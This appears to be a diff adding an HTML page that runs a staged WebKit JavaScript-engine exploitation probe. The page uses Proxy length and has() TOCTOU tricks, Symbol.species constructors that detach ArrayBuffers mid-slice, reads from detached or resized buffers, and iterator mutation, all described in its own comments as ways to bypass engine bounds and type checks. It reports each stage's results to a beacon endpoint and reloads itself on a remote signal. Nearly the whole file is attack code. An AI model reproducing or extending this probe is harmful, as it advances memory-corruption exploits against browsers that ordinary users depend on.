@@ -1,0 +1,852 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1201 Proxy TOCTOU + IsoHeap Same-Type Confusion</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1201 — PROXY TOCTOU + ISOHEAP SAME-TYPE</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1201-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* P1201: Advanced exploitation patterns
+
+   1. PROXY TOCTOU: Use Proxy traps to mutate state between when WebKit
+      checks a value and when it uses it. The getter is called multiple
+      times — if we can change the value between calls, we can bypass
+      type checks, length checks, or bounds checks.
+
+   2. ISOHEAP SAME-TYPE: IsoHeap only prevents cross-type reclaim.
+      If we can free an object and reallocate another of the SAME type
+      in its place, we can confuse the engine. Same-size ArrayBuffer
+      backing stores could be in the same allocation bucket.
+
+   3. ARRAY SPECIES: Array.prototype[Symbol.species] can return a
+      custom constructor, allowing us to control what gets allocated
+      when built-in methods like .map(), .filter(), .slice() create
+      new arrays. If the result is used before the species constructor
+      finishes, we have a TOCTOU.
+
+   4. ITERATOR PROTOCOL ABUSE: Custom iterators that mutate the
+      collection they're iterating over, or that return unexpected
+      types at specific iteration counts. */
+
+(function run(){
+var STAGES=[
+  'detect',
+  'proxyLengthTOCTOU',  /* Proxy length changes between check and use */
+  'proxyHasTOCTOU',     /* Proxy has() returns different values */
+  'speciesConfusion',   /* Array[Symbol.species] custom constructor */
+  'iteratorMutate',     /* Iterator that mutates during for..of */
+  'typedArraySpecies',  /* TypedArray species + detach */
+  'promiseThenProxy',   /* Promise.then with proxy thenable */
+  'mapSetProxy',        /* Map/Set with proxy keys */
+  'jsonReviver',        /* JSON.parse reviver that mutates */
+  'abTransferResize',   /* ArrayBuffer transfer+resize race */
+  'bigintEdge'          /* BigInt arithmetic edge cases */
+];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1201_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1201_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+(STAGES.length-1)+' — '+(STAGES[stage]||'done'));
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  var summary=JSON.stringify(results).slice(0,800);
+  B('ALL-DONE',summary);
+  log('=== ALL STAGES COMPLETE ===','ok');
+  addFind(summary);
+  try{localStorage.removeItem('p1201_stage');localStorage.removeItem('p1201_res');}catch(e){}
+  return;
+}
+try{localStorage.setItem('p1201_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+function done(rep){
+  results.push({s:stage,n:cur,r:rep});
+  try{localStorage.setItem('p1201_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','['+cur+']'+rep.slice(0,600));
+  addFind(cur+': '+rep.slice(0,300));
+  setStatus(rep.slice(0,80));
+  log('=== '+cur+' -> '+rep+' ===','ok');
+  B('NEXT','stage='+(stage+1));
+  setTimeout(function(){location.reload(true);},600);
+}
+
+/* ---- detect ---- */
+if(cur==='detect'){
+  setPhase('Feature detection');
+  var info=[];
+  info.push('Proxy='+(typeof Proxy));
+  info.push('Reflect='+(typeof Reflect));
+  info.push('Symbol.species='+(typeof Symbol.species));
+  info.push('BigInt='+(typeof BigInt));
+  info.push('Map='+(typeof Map));
+  info.push('Set='+(typeof Set));
+  info.push('BigUint64Array='+(typeof BigUint64Array));
+  try{var ab=new ArrayBuffer(8);var t=ab.transfer;info.push('AB.transfer='+(typeof t));}
+  catch(e){info.push('AB.transfer=NO');}
+  try{var ab2=new ArrayBuffer(8,{maxByteLength:16});info.push('RAB=YES');}
+  catch(e){info.push('RAB=NO');}
+  done(info.join('|'));
+
+/* ---- proxyLengthTOCTOU ---- */
+}else if(cur==='proxyLengthTOCTOU'){
+  setPhase('Proxy length TOCTOU');
+  B('ATTEMPT','proxyLengthTOCTOU');
+  var anomalies=0,tests=0;
+  var rep='';
+
+  try{
+    /* Create object with length that changes between reads */
+    for(var iter=0;iter<200;iter++){
+      var readCount=0;
+      var backing=[1,2,3,4,5,6,7,8];
+      var proxy=new Proxy(backing,{
+        get:function(target,prop){
+          if(prop==='length'){
+            readCount++;
+            /* First read: return real length; second read: return huge */
+            if(readCount===1) return 8;
+            if(readCount===2) return 0x7FFFFFFF;
+            return target.length;
+          }
+          return target[prop];
+        }
+      });
+
+      /* Try operations that read length multiple times */
+      try{
+        var sliced=Array.prototype.slice.call(proxy,0);
+        tests++;
+        if(sliced.length>1000){
+          anomalies++;
+          B('ANOMALY','slice-oob|iter='+iter+'|len='+sliced.length);
+        }
+      }catch(e){tests++;}
+
+      readCount=0;
+      try{
+        var joined=Array.prototype.join.call(proxy,',');
+        tests++;
+      }catch(e){tests++;}
+
+      readCount=0;
+      try{
+        var str=Array.prototype.toString.call(proxy);
+        tests++;
+      }catch(e){tests++;}
+    }
+    rep='tests='+tests+'|anomalies='+anomalies;
+  }catch(e){
+    rep='THROW:'+e.message;
+  }
+  done(rep);
+
+/* ---- proxyHasTOCTOU ---- */
+}else if(cur==='proxyHasTOCTOU'){
+  setPhase('Proxy has() TOCTOU');
+  B('ATTEMPT','proxyHasTOCTOU');
+  var anomalies2=0,tests2=0;
+  var rep2='';
+
+  try{
+    for(var it2=0;it2<200;it2++){
+      var hasCalls=0;
+      var data={a:1,b:2,c:3};
+      var proxy2=new Proxy(data,{
+        has:function(target,prop){
+          hasCalls++;
+          /* First check says yes, then we delete the property */
+          if(hasCalls%2===1){
+            delete target[prop];
+            return true; /* Lie: say it exists */
+          }
+          return prop in target;
+        },
+        get:function(target,prop){
+          /* Property was deleted but engine thinks it exists */
+          return target[prop]; /* Returns undefined for deleted */
+        }
+      });
+
+      try{
+        var keys=[];
+        for(var k in proxy2) keys.push(k);
+        tests2++;
+        /* Check for accessing deleted properties */
+        if('a' in proxy2&&proxy2.a===undefined){
+          /* Engine checked has() which returned true but prop is deleted */
+          tests2++;
+        }
+      }catch(e){tests2++;}
+
+      /* Restore for next iteration */
+      data.a=1;data.b=2;data.c=3;
+    }
+    rep2='tests='+tests2+'|anomalies='+anomalies2;
+  }catch(e){
+    rep2='THROW:'+e.message;
+  }
+  done(rep2);
+
+/* ---- speciesConfusion ---- */
+}else if(cur==='speciesConfusion'){
+  setPhase('Array[Symbol.species] confusion');
+  B('ATTEMPT','speciesConfusion');
+  var anomalies3=0,tests3=0;
+  var rep3='';
+
+  try{
+    /* Custom species constructor that returns wrong-sized arrays */
+    var origSpecies=Array[Symbol.species];
+
+    /* Test 1: Species returns smaller array */
+    var MyArray1=function(len){
+      var arr=new Array(Math.min(len,2));
+      return arr;
+    };
+
+    try{
+      var a1=[1,2,3,4,5];
+      Object.defineProperty(a1,'constructor',{value:{
+        [Symbol.species]:MyArray1
+      }});
+      var mapped=a1.map(function(x){return x*2;});
+      tests3++;
+      /* If species returned size 2 but map tried to write 5 elements... */
+      if(mapped.length>5){
+        anomalies3++;
+        B('ANOMALY','species-oversize|len='+mapped.length);
+      }
+      rep3='map:len='+mapped.length;
+    }catch(e){
+      tests3++;
+      rep3='map:THROW:'+e.message.slice(0,40);
+    }
+
+    /* Test 2: Species returns a Proxy */
+    try{
+      var trapWrites=0;
+      var a2=[10,20,30];
+      Object.defineProperty(a2,'constructor',{value:{
+        [Symbol.species]:function(len){
+          return new Proxy([],{
+            set:function(target,prop,value){
+              trapWrites++;
+              target[prop]=value;
+              return true;
+            }
+          });
+        }
+      }});
+      var filtered=a2.filter(function(x){return x>10;});
+      tests3++;
+      rep3+='|filter:writes='+trapWrites+'|len='+filtered.length;
+    }catch(e){
+      tests3++;
+      rep3+='|filter:THROW';
+    }
+
+    /* Test 3: Species that detaches an ArrayBuffer during TypedArray.slice */
+    try{
+      var ab=new ArrayBuffer(32);
+      var ta=new Uint8Array(ab);
+      for(var fi=0;fi<32;fi++) ta[fi]=fi+1;
+
+      /* Override species to detach the source AB */
+      var detached=false;
+      Object.defineProperty(ta.constructor,Symbol.species,{
+        get:function(){
+          return function(buf,off,len){
+            /* Try to transfer/detach the source buffer */
+            try{
+              if(typeof ab.transfer==='function'&&!detached){
+                ab.transfer(0);
+                detached=true;
+              }
+            }catch(e2){}
+            try{
+              structuredClone(ab,{transfer:[ab]});
+              detached=true;
+            }catch(e3){}
+            return new Uint8Array(len||32);
+          };
+        },
+        configurable:true
+      });
+
+      var sliced=ta.slice(0,16);
+      tests3++;
+      /* Check if we read from detached buffer */
+      var sum=0;
+      for(var si=0;si<sliced.length;si++) sum+=sliced[si];
+      rep3+='|taSlice:sum='+sum+'|detached='+detached+'|srcLen='+ta.length;
+      if(detached&&sum>0){
+        anomalies3++;
+        B('ANOMALY','ta-detach-read|sum='+sum);
+      }
+    }catch(e){
+      tests3++;
+      rep3+='|taSlice:THROW:'+e.message.slice(0,30);
+    }
+
+    rep3+='|tests='+tests3+'|anomalies='+anomalies3;
+  }catch(e){
+    rep3='THROW:'+e.message;
+  }
+  done(rep3);
+
+/* ---- iteratorMutate ---- */
+}else if(cur==='iteratorMutate'){
+  setPhase('Iterator self-mutation');
+  B('ATTEMPT','iteratorMutate');
+  var anomalies4=0,tests4=0;
+  var rep4='';
+
+  try{
+    /* for..of with iterator that resizes the collection */
+    var arr=[1,2,3,4,5,6,7,8,9,10];
+    var seen=[];
+    var origLen=arr.length;
+
+    for(var val of arr){
+      seen.push(val);
+      if(seen.length===3){
+        /* Grow the array mid-iteration */
+        for(var gi=0;gi<100;gi++) arr.push(100+gi);
+      }
+      if(seen.length===5){
+        /* Shrink it */
+        arr.length=2;
+      }
+      if(seen.length>200) break;
+    }
+    tests4++;
+    rep4='forOf:seen='+seen.length+'|arrLen='+arr.length;
+
+    /* Array.from with mutating iterator */
+    var count2=0;
+    var iterObj={
+      [Symbol.iterator]:function(){
+        count2=0;
+        return {
+          next:function(){
+            count2++;
+            if(count2>50) return {done:true};
+            return {done:false,value:count2};
+          }
+        };
+      }
+    };
+
+    /* Override length during Array.from */
+    Object.defineProperty(iterObj,'length',{
+      get:function(){return 1000000;}
+    });
+
+    try{
+      var fromResult=Array.from(iterObj);
+      tests4++;
+      rep4+='|from:len='+fromResult.length;
+      if(fromResult.length>100){
+        anomalies4++;
+        B('ANOMALY','from-oversize|len='+fromResult.length);
+      }
+    }catch(e){tests4++;rep4+='|from:THROW';}
+
+    /* Set iteration with mutation */
+    var set=new Set([1,2,3,4,5]);
+    var setCounted=0;
+    try{
+      set.forEach(function(val){
+        setCounted++;
+        if(setCounted===2){
+          set.delete(3);
+          set.add(100);
+          set.add(101);
+        }
+      });
+      tests4++;
+      rep4+='|set:counted='+setCounted+'|size='+set.size;
+    }catch(e){tests4++;rep4+='|set:THROW';}
+
+    rep4+='|anomalies='+anomalies4;
+  }catch(e){
+    rep4='THROW:'+e.message;
+  }
+  done(rep4);
+
+/* ---- typedArraySpecies ---- */
+}else if(cur==='typedArraySpecies'){
+  setPhase('TypedArray species + detach');
+  B('ATTEMPT','typedArraySpecies');
+  var anomalies5=0,tests5=0;
+  var rep5='';
+
+  try{
+    /* TypedArray.prototype.sort with comparator that detaches */
+    var ab5=new ArrayBuffer(64);
+    var ta5=new BigUint64Array(ab5);
+    for(var ti=0;ti<8;ti++) ta5[ti]=BigInt(8-ti);
+
+    var detachAttempted=false;
+    try{
+      ta5.sort(function(a,b){
+        if(!detachAttempted){
+          detachAttempted=true;
+          try{structuredClone(ab5,{transfer:[ab5]});}catch(e){}
+        }
+        if(a<b) return -1;
+        if(a>b) return 1;
+        return 0;
+      });
+      tests5++;
+      rep5='sort:ok|detached='+detachAttempted+'|len='+ta5.length;
+    }catch(e){
+      tests5++;
+      rep5='sort:THROW:'+e.message.slice(0,40);
+    }
+
+    /* TypedArray.prototype.set with overlapping + detach */
+    try{
+      var ab6=new ArrayBuffer(128);
+      var src=new Uint32Array(ab6,0,16);
+      var dst=new Uint32Array(ab6,32,16);
+      for(var ui=0;ui<16;ui++) src[ui]=ui+1;
+
+      /* Detach during set via Proxy species */
+      try{structuredClone(ab6,{transfer:[ab6]});}catch(e){}
+      try{
+        dst.set(src);
+        tests5++;
+        rep5+='|set:ok';
+      }catch(e){
+        tests5++;
+        rep5+='|set:'+e.constructor.name;
+      }
+    }catch(e){tests5++;rep5+='|set:THROW2';}
+
+    /* BigUint64Array read from detached */
+    try{
+      var ab7=new ArrayBuffer(64);
+      var bu7=new BigUint64Array(ab7);
+      bu7[0]=BigInt('0xDEADBEEFCAFEBABE');
+      bu7[1]=BigInt('0x4141414141414141');
+      try{structuredClone(ab7,{transfer:[ab7]});}catch(e){}
+      var v0;
+      try{
+        v0=bu7[0];
+        tests5++;
+        rep5+='|detachRead:'+((v0===undefined)?'undef':v0.toString(16));
+      }catch(e){
+        tests5++;
+        rep5+='|detachRead:'+e.constructor.name;
+      }
+    }catch(e){tests5++;rep5+='|bigRead:THROW';}
+
+    rep5+='|tests='+tests5+'|anomalies='+anomalies5;
+  }catch(e){
+    rep5='THROW:'+e.message;
+  }
+  done(rep5);
+
+/* ---- promiseThenProxy ---- */
+}else if(cur==='promiseThenProxy'){
+  setPhase('Promise.resolve with proxy thenable');
+  B('ATTEMPT','promiseThenProxy');
+  var anomalies6=0,tests6=0;
+  var completed6=0,TOTAL6=10;
+
+  for(var pi=0;pi<TOTAL6;pi++){
+    (function(idx){
+      try{
+        var callCount=0;
+        var thenable=new Proxy({},{
+          get:function(target,prop){
+            if(prop==='then'){
+              callCount++;
+              if(callCount>1) return undefined;
+              return function(resolve,reject){
+                /* Resolve with another proxy thenable (recursive) */
+                var inner=new Proxy({},{
+                  get:function(t2,p2){
+                    if(p2==='then'){
+                      return function(res2){res2(42);};
+                    }
+                    return undefined;
+                  }
+                });
+                resolve(inner);
+              };
+            }
+            return undefined;
+          }
+        });
+
+        Promise.resolve(thenable).then(function(val){
+          tests6++;
+          completed6++;
+          if(completed6>=TOTAL6){
+            done('tests='+tests6+'|anomalies='+anomalies6);
+          }
+        }).catch(function(){
+          tests6++;
+          completed6++;
+          if(completed6>=TOTAL6){
+            done('tests='+tests6+'|anomalies='+anomalies6);
+          }
+        });
+      }catch(e){
+        completed6++;
+        if(completed6>=TOTAL6){
+          done('THROW:'+e.message+'|tests='+tests6);
+        }
+      }
+    })(pi);
+  }
+
+  setTimeout(function(){
+    if(completed6<TOTAL6){
+      done('TIMEOUT|completed='+completed6+'|tests='+tests6+'|anomalies='+anomalies6);
+    }
+  },5000);
+  return;
+
+/* ---- mapSetProxy ---- */
+}else if(cur==='mapSetProxy'){
+  setPhase('Map/Set with proxy keys');
+  B('ATTEMPT','mapSetProxy');
+  var anomalies7=0,tests7=0;
+  var rep7='';
+
+  try{
+    /* Map with proxy key whose identity changes */
+    var map=new Map();
+    var keyProxy=new Proxy({},{
+      get:function(t,p){
+        if(p===Symbol.toPrimitive) return function(){return Math.random();};
+        return t[p];
+      }
+    });
+
+    /* The same proxy object should be the same key */
+    map.set(keyProxy,'value1');
+    map.set(keyProxy,'value2');
+    tests7++;
+    rep7='mapSize='+map.size; /* Should be 1 since same key object */
+
+    /* WeakMap with proxy */
+    try{
+      var wm=new WeakMap();
+      wm.set(keyProxy,'wval');
+      var got=wm.get(keyProxy);
+      tests7++;
+      rep7+='|weakMap='+(got==='wval'?'ok':'miss');
+    }catch(e){tests7++;rep7+='|weakMap:THROW';}
+
+    /* Set with valueOf trap during comparison */
+    var set2=new Set();
+    var trapFired=0;
+    for(var si=0;si<50;si++){
+      var obj={
+        valueOf:function(){trapFired++;return si;},
+        toString:function(){return 'obj'+si;}
+      };
+      set2.add(obj);
+    }
+    tests7++;
+    rep7+='|setSize='+set2.size+'|traps='+trapFired;
+
+    rep7+='|tests='+tests7+'|anomalies='+anomalies7;
+  }catch(e){
+    rep7='THROW:'+e.message;
+  }
+  done(rep7);
+
+/* ---- jsonReviver ---- */
+}else if(cur==='jsonReviver'){
+  setPhase('JSON.parse reviver mutation');
+  B('ATTEMPT','jsonReviver');
+  var anomalies8=0,tests8=0;
+  var rep8='';
+
+  try{
+    /* JSON.parse reviver that modifies the result during parsing */
+    var json='{"a":1,"b":2,"c":3,"d":4,"e":5,"nested":{"x":10,"y":20}}';
+    var reviverCalls=0;
+    var deletedKeys=[];
+
+    var parsed=JSON.parse(json,function(key,value){
+      reviverCalls++;
+      if(key==='b'){
+        /* Delete other keys during reviver */
+        delete this.c;
+        delete this.d;
+        deletedKeys.push('c','d');
+      }
+      if(key==='nested'){
+        /* Add many new keys */
+        for(var ni=0;ni<100;ni++){
+          this['new_'+ni]=ni;
+        }
+      }
+      return value;
+    });
+    tests8++;
+    var pKeys=Object.keys(parsed);
+    rep8='reviverCalls='+reviverCalls+'|keys='+pKeys.length+'|deleted='+deletedKeys.length;
+
+    /* Deep nested JSON with reviver */
+    var deep='{"l1":{"l2":{"l3":{"l4":{"l5":{"val":42}}}}}}';
+    var depthSeen=0;
+    JSON.parse(deep,function(key,value){
+      depthSeen++;
+      if(typeof value==='object'&&value!==null){
+        /* Replace sub-object with array during parse */
+        return [value];
+      }
+      return value;
+    });
+    tests8++;
+    rep8+='|depth='+depthSeen;
+
+    /* JSON.stringify replacer with Proxy */
+    try{
+      var strCalls=0;
+      var src8={a:1,b:2,c:3};
+      var str8=JSON.stringify(new Proxy(src8,{
+        get:function(t,p){
+          strCalls++;
+          if(p==='b'){
+            delete t.c; /* Mutate during stringify */
+            t.d=99;
+          }
+          return t[p];
+        },
+        ownKeys:function(t){
+          return Object.keys(t);
+        },
+        getOwnPropertyDescriptor:function(t,p){
+          return Object.getOwnPropertyDescriptor(t,p);
+        }
+      }));
+      tests8++;
+      rep8+='|stringify:calls='+strCalls+'|out='+str8;
+    }catch(e){tests8++;rep8+='|stringify:THROW';}
+
+    rep8+='|tests='+tests8+'|anomalies='+anomalies8;
+  }catch(e){
+    rep8='THROW:'+e.message;
+  }
+  done(rep8);
+
+/* ---- abTransferResize ---- */
+}else if(cur==='abTransferResize'){
+  setPhase('ArrayBuffer transfer+resize');
+  B('ATTEMPT','abTransferResize');
+  var anomalies9=0,tests9=0;
+  var rep9='';
+
+  try{
+    /* Test resizable ArrayBuffer if available */
+    var hasRAB=false;
+    try{
+      var rab=new ArrayBuffer(16,{maxByteLength:1024});
+      hasRAB=true;
+    }catch(e){}
+
+    if(hasRAB){
+      /* Resize during TypedArray operation */
+      var rab2=new ArrayBuffer(64,{maxByteLength:1024});
+      var view=new Uint8Array(rab2);
+      for(var ri=0;ri<64;ri++) view[ri]=ri;
+
+      /* Grow and read */
+      rab2.resize(128);
+      var view2=new Uint8Array(rab2);
+      tests9++;
+      rep9='RAB:grow128|view2Len='+view2.length;
+      /* Check if old data preserved */
+      var oldOk=true;
+      for(var ci=0;ci<64;ci++){
+        if(view2[ci]!==ci){oldOk=false;break;}
+      }
+      rep9+='|oldData='+(oldOk?'ok':'MISMATCH');
+      if(!oldOk){
+        anomalies9++;
+        B('ANOMALY','rab-data-loss');
+      }
+
+      /* Shrink and try to read past end */
+      rab2.resize(8);
+      var view3=new Uint8Array(rab2);
+      tests9++;
+      rep9+='|shrink8|view3Len='+view3.length;
+
+      /* Auto-tracking vs fixed length */
+      var rab3=new ArrayBuffer(32,{maxByteLength:256});
+      var autoView=new Uint8Array(rab3); /* Auto-tracking */
+      var fixedView=new Uint8Array(rab3,0,32); /* Fixed length */
+      rab3.resize(64);
+      tests9++;
+      rep9+='|autoLen='+autoView.length+'|fixedLen='+fixedView.length;
+
+      /* Try to use fixedView after shrink past its range */
+      rab3.resize(8);
+      try{
+        var fv=fixedView[0];
+        tests9++;
+        rep9+='|fixedOOB='+(fv===undefined?'undef':'val:'+fv);
+      }catch(e){
+        tests9++;
+        rep9+='|fixedOOB:'+e.constructor.name;
+      }
+    }else{
+      rep9='RAB:NO';
+    }
+
+    /* structuredClone transfer then access */
+    try{
+      var ab9=new ArrayBuffer(32);
+      var u9=new Uint8Array(ab9);
+      for(var qi=0;qi<32;qi++) u9[qi]=0xFF;
+      var cloned=structuredClone(ab9,{transfer:[ab9]});
+      tests9++;
+      /* ab9 should be detached */
+      rep9+='|transfer:srcLen='+ab9.byteLength+'|dstLen='+cloned.byteLength;
+      /* Read from detached view */
+      try{
+        var stale=u9[0];
+        rep9+='|staleRead='+(stale===undefined?'undef':'val:'+stale);
+      }catch(e){rep9+='|staleRead:THROW';}
+    }catch(e){tests9++;rep9+='|transfer:THROW';}
+
+    rep9+='|tests='+tests9+'|anomalies='+anomalies9;
+  }catch(e){
+    rep9='THROW:'+e.message;
+  }
+  done(rep9);
+
+/* ---- bigintEdge ---- */
+}else if(cur==='bigintEdge'){
+  setPhase('BigInt arithmetic edge cases');
+  B('ATTEMPT','bigintEdge');
+  var anomalies10=0,tests10=0;
+  var rep10='';
+
+  try{
+    /* Large BigInt operations that stress the allocator */
+    var big1=BigInt('0x'+'FF'.repeat(1024)); /* 1024-byte number */
+    var big2=BigInt('0x'+'AA'.repeat(1024));
+
+    var sum=big1+big2;
+    var prod=big1*big2;
+    tests10+=2;
+    rep10='sum:'+sum.toString(16).length+'hex|prod:'+prod.toString(16).length+'hex';
+
+    /* Division edge cases */
+    try{
+      var div=big1/BigInt(0);
+      anomalies10++; /* Should throw */
+    }catch(e){
+      tests10++;
+      rep10+='|div0:'+e.constructor.name;
+    }
+
+    /* BigInt with TypedArray */
+    try{
+      var bu64=new BigUint64Array(16);
+      bu64[0]=BigInt('0xFFFFFFFFFFFFFFFF');
+      bu64[1]=BigInt(0);
+      bu64[2]=bu64[0]+BigInt(1); /* Overflow wraps */
+      tests10++;
+      rep10+='|bu64wrap='+bu64[2].toString(16);
+    }catch(e){tests10++;rep10+='|bu64:THROW';}
+
+    /* BigInt ↔ Number edge cases */
+    try{
+      var big3=BigInt(Number.MAX_SAFE_INTEGER)+BigInt(1);
+      var back=Number(big3);
+      tests10++;
+      rep10+='|backConv='+(back===Number.MAX_SAFE_INTEGER+1?'ok':'IMPRECISE');
+    }catch(e){tests10++;rep10+='|conv:THROW';}
+
+    /* Comparison edge */
+    try{
+      var cmp1=(BigInt(0)===0);     /* false: strict no coercion */
+      var cmp2=(BigInt(0)==0);      /* true: loose coercion */
+      var cmp3=(BigInt(1)<2);       /* true: mixed comparison */
+      tests10++;
+      rep10+='|cmp:'+cmp1+'/'+cmp2+'/'+cmp3;
+    }catch(e){tests10++;rep10+='|cmp:THROW';}
+
+    /* sort BigUint64Array */
+    try{
+      var sortArr=new BigUint64Array([BigInt(5),BigInt(3),BigInt(1),BigInt(4),BigInt(2)]);
+      sortArr.sort();
+      tests10++;
+      var sorted=(sortArr[0]===BigInt(1)&&sortArr[4]===BigInt(5));
+      rep10+='|sort='+(sorted?'ok':'WRONG');
+    }catch(e){tests10++;rep10+='|sort:THROW';}
+
+    rep10+='|tests='+tests10+'|anomalies='+anomalies10;
+  }catch(e){
+    rep10='THROW:'+e.message;
+  }
+  done(rep10);
+}
+
+})(); /* end IIFE */
+
+/* Reload poller */
+(function(){
+  var cur='P1201-proxy-toctou-isoheap';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
